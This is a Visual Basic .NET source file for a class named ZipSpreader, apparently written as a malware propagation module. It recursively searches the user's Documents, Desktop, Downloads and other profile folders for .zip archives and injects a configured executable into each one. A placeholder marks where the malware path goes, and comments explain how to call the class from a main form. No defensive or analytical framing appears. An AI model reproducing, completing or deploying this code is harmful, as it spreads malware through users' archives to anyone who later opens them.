Imports System.IO
Imports System.IO.Compression

Public Class ZipSpreader

    'How to invoke (from main form):
    '
    '     Private zs As New ZipSpreader()
    '
    '     zs.Spread()


    'Requirements:
    '
    ' Go to:
    '
    '     Assemblies > Framework > Add > System.IO.Compression


    Private targets As New List(Of String)()

    'your payload here
    Private payload As String = "C:\your_path\your_malware.exe"

    Public Sub Spread()

        Dim targ_dirs As New List(Of String) From {
            "Documents", "Desktop", "Videos", "Music", "Favorites", "Downloads", "Pictures"
        }

        For Each dir As String In targ_dirs
            'index zip files in common-user locations
            Index(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), dir))
        Next

        For Each zip_file As String In targets
            'inject payload
            ZipInject(zip_file)
        Next
    End Sub

    Private Sub Index(dir_path As String)
        Try
            'get all files in current directory
            Dim files As String() = Directory.GetFiles(dir_path)

            For Each file As String In files
                'index if compressed zip folder
                If file.ToLower().EndsWith(".zip") Then
                    targets.Add(file)
                End If
            Next

            'get all sub-directories in current directory
            Dim sub_dirs As String() = Directory.GetDirectories(dir_path)

            'recursively index sub-directories
            For Each sub_dir As String In sub_dirs
                Dim dir_name As String = Path.GetFileName(sub_dir)
                
                'avoid problematic win-vista hidden system-directories
                If dir_name <> "My Music" AndAlso dir_name <> "My Pictures" AndAlso dir_name <> "My Videos" Then
                    Index(sub_dir)
                End If
            Next
        Catch ex As UnauthorizedAccessException
            'access denied
        Catch ex As Exception
            'only God knows...
        End Try
    End Sub

    Private Sub ZipInject(zip_file As String)
        Try
            'open compressed folder
            Using archive As ZipArchive = ZipFile.Open(zip_file, ZipArchiveMode.Update)
                'inject payload
                archive.CreateEntryFromFile(payload, Path.GetFileName(payload))
            End Using
        Catch : End Try
    End Sub
End Class
